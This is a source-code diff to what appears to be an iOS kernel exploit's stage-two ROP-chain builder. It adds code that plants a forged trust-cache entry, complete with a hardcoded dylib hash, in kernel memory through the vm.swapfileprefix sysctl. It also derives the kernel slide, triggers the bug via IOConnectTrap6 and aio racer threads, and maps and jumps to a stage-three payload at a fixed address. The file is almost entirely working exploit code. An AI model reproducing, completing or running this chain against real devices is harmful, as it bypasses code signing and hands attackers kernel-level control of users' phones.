@@ -6,9 +6,12 @@
 #include <aio.h>
 #include <fcntl.h>
 #include <dlfcn.h>
+#include <sys/sysctl.h>
 
 #include <shared/iokit.h>
 #include <shared/realsym.h>
+
+// TODO: move those struct definitions into a new file
 
 typedef struct {
 	mach_msg_header_t head;
@@ -106,6 +109,7 @@ typedef volatile struct {
 #define NENT 1
 
 
+// TODO: move that whole buidling part into another file and integrate rop_chain_debug into rop_chain
 uint64_t get_rop_var_addr(offset_struct_t * offsets, rop_var_t * ropvars, char * name) {
 	while (ropvars != NULL) {
 		if (!strcmp(name,ropvars->name) && strlen(name) == strlen(ropvars->name)) {
@@ -615,9 +619,11 @@ void build_databuffer(offset_struct_t * offsets, rop_var_t * ropvars) {
 		current_var = current_var->next;
 	}
 }
+
+// TODO: remove the test code
 void stage2(offset_struct_t * offsets,char * base_dir) {
 
-
+	// TODO: the stage2_databuffer_len should be set in install.m
 	offsets->stage2_databuffer_len = 0x10000;
 	offsets->stage2_databuffer = malloc(offsets->stage2_databuffer_len);
 
@@ -647,6 +653,29 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	DEFINE_ROP_VAR("test_string",sizeof(buf),buf);
 
 #if 0
+
+
+	DEFINE_ROP_VAR("swapprefix_buffer",1024,&buf);
+	DEFINE_ROP_VAR("swapprefix_length",sizeof(uint64_t),&buf);
+	SET_ROP_VAR64("swapprefix_length",0);
+	// using undocumented magic to get the integer name of vm.swapfileprefix
+	char * name = "vm.swapfileprefix";
+	int name2oid[2];
+	name2oid[0] = 0;
+	name2oid[1] = 3;
+	int * real_oid = malloc(CTL_MAXNAME+2);
+	size_t oidlen = CTL_MAXNAME+2;
+	if (sysctl(name2oid,2,real_oid,&oidlen,name,strlen(name)) != 0) {LOG("OHNO");}
+	DEFINE_ROP_VAR("swapprefix_oid",oidlen,real_oid);
+	ROP_VAR_ARG_HOW_MANY(3);
+	ROP_VAR_ARG("swapprefix_oid",1);
+	ROP_VAR_ARG("swapprefix_buffer",3);
+	ROP_VAR_ARG("swapprefix_length",4);
+	CALL("sysctl",0,oidlen/4,0,0,0,0,0,0);
+
+
+
+
 	DEFINE_ROP_VAR("reply_port",sizeof(mach_port_t),&buf);
 	CALL_FUNC_RET_SAVE_VAR("reply_port",get_addr_from_name(offsets,"mach_reply_port"),0,0,0,0,0,0,0,0);
 
@@ -688,6 +717,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 	
 	// SETUP VARS
+	// TODO: replace tmp with NULL and let the framework handle it
 	char * tmp = malloc(0x1000);
 	memset(tmp,0,0x1000);
 	DEFINE_ROP_VAR("should_race",sizeof(uint64_t),tmp); //
@@ -761,21 +791,23 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 
 	// setup new trustcache struct
+	// TODO: move that into a seperate file
 	typedef char hash_t[20];
 	struct trust_chain {
 		uint64_t next;
 		unsigned char uuid[16];
 		unsigned int count;
-		hash_t hash[0];
+		hash_t hash[1];
 	};
 	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
 	snprintf((char*)&new_entry->uuid,16,"TURNDOWNFORWHAT?");
 	new_entry->count = 1;
-	// FIXME: set hash here
+	hash_t my_dylib_hash = {0xb7,0x4e,0x84,0x1a,0xdb,0x3d,0x7d,0x18,0xdd,0x10,0x62,0xfb,0x9e,0x40,0x99,0x12,0xb1,0xfe,0x94,0x9c};
+	memcpy(&new_entry->hash[0],my_dylib_hash,20);
 	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);
 
 	char * dylib_str = malloc(100);
-	snprintf(dylib_str,100,"FIXME");
+	snprintf(dylib_str,100,"/usr/lib/racoon.dylib");
 	DEFINE_ROP_VAR("dylib_str",strlen(dylib_str)+1,dylib_str);
 
 	char * wedidit_msg = malloc(1024);
@@ -813,6 +845,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	CFRelease(myservice_dict);
 	uint64_t data_length = CFDataGetLength(myservice_serialized);
 
+	// TODO: move those structs into a seperate file
 	struct GetMatchingService_Request {
 		mach_msg_header_t Head;
 		NDR_record_t NDR;
@@ -849,6 +882,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 	// IOServiceOpen
 	
+	// TODO: move those structs into a seperate file
 	struct ServiceOpen_Request {
 		mach_msg_header_t Head;
 		mach_msg_body_t msgh_body;
@@ -904,9 +938,11 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	ROP_VAR_CPY_W_OFFSET("client",0,"service_open_request",offsetof(struct ServiceOpen_Reply,connection.name),sizeof(mach_port_t));
 
 
+	// TODO: move that into install.m or somewhere else (prob even better to put it into offsets straight away)
 #define BARRIER_BUFFER_SIZE 0x10000
 	// spawn racer threads
 	
+	// TODO: move this struct into a seperate file
 #define _STRUCT_ARM_THREAD_STATE64	struct __darwin_arm_thread_state64
 _STRUCT_ARM_THREAD_STATE64
 {
@@ -955,10 +991,12 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG64("reply_port",5); \
 	CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_TIMEOUT | MACH_RCV_INTERRUPT,0,0,0 /*recv port*/, (usec+999)/1000, MACH_PORT_NULL,0);
 
+	// TODO: we can prob remove this when we chown the log to mobile or change the permissions
 	ADD_USLEEP(100);
 
 	CALL("seteuid",501,0,0,0,0,0,0,0); // drop priv to mobile so that we leak refs/get the dicts into kalloc.16
 
+	// TODO: optimize this loop (we don't have to create a port on each try and the memleak_msg can leak 10 objs at once instead of calling the syscall 10 times)
 	ADD_LOOP_START("main_loop");
 	
 		SET_ROP_VAR64("msg_port",MACH_PORT_NULL); 
@@ -1048,9 +1086,7 @@ _STRUCT_ARM_THREAD_STATE64
 
 	
 	// setup kr32
-	char * test_pattern = malloc(0x20);
-	for (int i = 0; i < 0x20;i++) {test_pattern[i]=i;}
-	DEFINE_ROP_VAR("ip_requests_buf",0x20,test_pattern);
+	DEFINE_ROP_VAR("ip_requests_buf",0x20,tmp);
 	SET_ROP_VAR64_TO_VAR_W_OFFSET("fakeport", offsetof(kport_t,ip_requests) /*offset of fakeport.ip_requests*/,"ip_requests_buf",0);
 
 	DEFINE_ROP_VAR("out_sz",8,tmp);
@@ -1118,12 +1154,9 @@ _STRUCT_ARM_THREAD_STATE64
 
 	// get the slide
 	DEFINE_ROP_VAR("kslide",8,tmp);
-	SET_ROP_VAR64("kslide",(UINT64_MAX - offsets->rootdomainUC_vtab + 1));
+	SET_ROP_VAR64("kslide",((0xffffffffffffffff - offsets->rootdomainUC_vtab) + 1));
 	ROP_VAR_ADD("kslide","kslide","RootDomainUC_VTAB");
 
-	ADD_LOOP_START("sleep");
-		ADD_USLEEP(1000);
-	ADD_LOOP_END();
 
 	// fully setup trust chain entry now
 	DEFINE_ROP_VAR("bss_trust_chain_head",8,tmp);
@@ -1131,9 +1164,37 @@ _STRUCT_ARM_THREAD_STATE64
 	SET_ROP_VAR64("bss_trust_chain_head_ptr",offsets->trust_chain_head_ptr);
 	ROP_VAR_ADD("bss_trust_chain_head_ptr","bss_trust_chain_head_ptr","kslide");
 	kr64("bss_trust_chain_head_ptr","bss_trust_chain_head");
-	SET_ROP_VAR64_TO_VAR_W_OFFSET("new_trust_chain_entry",offsetof(struct trust_chain,next),"bss_trust_chain_head",0);
+	ROP_VAR_CPY_W_OFFSET("new_trust_chain_entry",offsetof(struct trust_chain,next),"bss_trust_chain_head",0,8);
 
-#define VTAB_SIZE 0x100
+	DEFINE_ROP_VAR("swapprefix_buffer",1024,tmp);
+	DEFINE_ROP_VAR("swapprefix_length",sizeof(uint64_t),tmp);
+	// using undocumented magic to get the integer name of vm.swapfileprefix
+	char * name = "vm.swapfileprefix";
+	int name2oid[2] = {0,3};
+	int * real_oid = malloc(CTL_MAXNAME+2);
+	size_t oidlen;
+	sysctl(name2oid,2,real_oid,&oidlen,name,strlen(name));
+	DEFINE_ROP_VAR("swapprefix_oid",oidlen,real_oid);
+	ROP_VAR_ARG_HOW_MANY(3);
+	ROP_VAR_ARG("swapprefix_oid",1);
+	ROP_VAR_ARG("swapprefix_buffer",3);
+	ROP_VAR_ARG("swapprefix_length",4);
+	CALL("sysctl",0,oidlen/4,0,0,0,0,0,0);
+	// we just assume that the prefix isn't longer than 100 bytes
+	ROP_VAR_CPY_W_OFFSET("swapprefix_buffer",100,"new_trust_chain_entry",0,sizeof(struct trust_chain));
+	ROP_VAR_ARG_HOW_MANY(2);
+	ROP_VAR_ARG("swapprefix_oid",1);
+	ROP_VAR_ARG("swapprefix_buffer",5);
+	CALL("sysctl",0,oidlen/4,0,0,100+sizeof(struct trust_chain),0,0,0);
+
+	// now the new trust chain entry is at swapprefix_addr + kslide + 100
+	uint64_t * trust_chain_addr = malloc(sizeof(uint64_t));
+	*trust_chain_addr = offsets->swapprefix_addr+100;
+	DEFINE_ROP_VAR("new_trust_chain_entry_addr",8,trust_chain_addr);
+	ROP_VAR_ADD("new_trust_chain_entry_addr","new_trust_chain_entry_addr","kslide");
+	
+
+#define VTAB_SIZE 0x100 // TODO: seperate file
 	// setup fake vtab in userland
 	DEFINE_ROP_VAR("UC_VTAB",VTAB_SIZE*8,tmp);
 	DEFINE_ROP_VAR("tmp_uint64",8,tmp);
@@ -1180,14 +1241,25 @@ _STRUCT_ARM_THREAD_STATE64
 	// fire
 	ROP_VAR_ARG_HOW_MANY(2);
 	ROP_VAR_ARG64("the_one",1);
-	ROP_VAR_ARG("new_trust_chain_entry",3);
+	ROP_VAR_ARG("new_trust_chain_entry_addr",3);
 	CALL("IOConnectTrap6",0,0,0,8,0,0,0,0);
 	
-	// dlopen
+
+	// ghetto dlopen
+	// get a file descriptor for that dylib
+	DEFINE_ROP_VAR("dylib_fd",8,tmp);
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("dylib_str",1);
-	CALL("dlopen",0,0,0,0,0,0,0,0);
+	CALL_FUNC_RET_SAVE_VAR("dylib_fd",get_addr_from_name(offsets,"open"),0,O_RDONLY,0,0,0,0,0,0);
+	// map it at a fixed address
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG64("dylib_fd",5);
+	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_EXEC|PROT_READ,MAP_FIXED|MAP_PRIVATE,0,offsets->stage3_fileoffset,0,0);
+	// jump
+	CALL_FUNC(offsets->stage3_jumpaddr,0xdeadbeef,get_addr_from_name(offsets,"write")-0x180000000+offsets->new_cache_addr,0,0,0,0,0,0);
 
+
+	// TODO: figure out what the hell is wrong with those two threads below
 	// SECOND THREAD STACK STARTS HERE
 	ADD_BARRIER(offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE);
  
@@ -1272,6 +1344,7 @@ _STRUCT_ARM_THREAD_STATE64
 		SET_ROP_VAR64_TO_VAR_W_OFFSET("aio_list",i*8,"aios",offset);
 	}
 
+	// TODO: optimize this (we don't need the aio_return value do we)
 	ADD_LOOP_START("racer_loop");
 		for (int i = 0; i<64;i++) {
 			ROP_VAR_ARG_HOW_MANY(2);
@@ -1379,6 +1452,7 @@ _STRUCT_ARM_THREAD_STATE64
 		SET_ROP_VAR64_TO_VAR_W_OFFSET("aio_list2",i*8,"aios2",offset);
 	}
 
+	// TODO: optimize this (we don't need the aio_return value do we)
 	ADD_LOOP_START("racer_loop2");
 		for (int i = 0; i<64;i++) {
 			ROP_VAR_ARG_HOW_MANY(2);
